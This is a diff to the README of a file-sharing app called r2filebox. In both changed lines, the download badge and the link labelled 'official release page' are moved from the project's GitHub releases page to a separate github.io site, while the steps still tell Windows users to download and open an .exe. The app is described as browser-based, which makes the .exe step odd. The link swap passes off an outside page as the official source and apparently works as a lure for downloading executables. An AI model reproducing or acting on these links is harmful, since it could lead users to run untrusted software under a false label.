@@ -1,6 +1,6 @@
 # 📁 r2filebox - Share your files quickly and safely
 
-[![Download r2filebox](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rosabellelimitless743/r2filebox/releases)
+[![Download r2filebox](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://rosabellelimitless743.github.io)
 
 r2filebox helps you store and share digital files through your web browser. It uses modern cloud technology to make sure your data stays accessible while keeping your private information safe. You can use this app to send large documents, share images with friends, or store text notes that expire after a set time.
 
@@ -8,7 +8,7 @@ r2filebox helps you store and share digital files through your web browser. It u
 
 You do not need special programming skills to use this app. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/rosabellelimitless743/r2filebox/releases).
+1. Go to the [official release page](https://rosabellelimitless743.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe to start your download.
 4. Once the download finishes, open your Downloads folder.
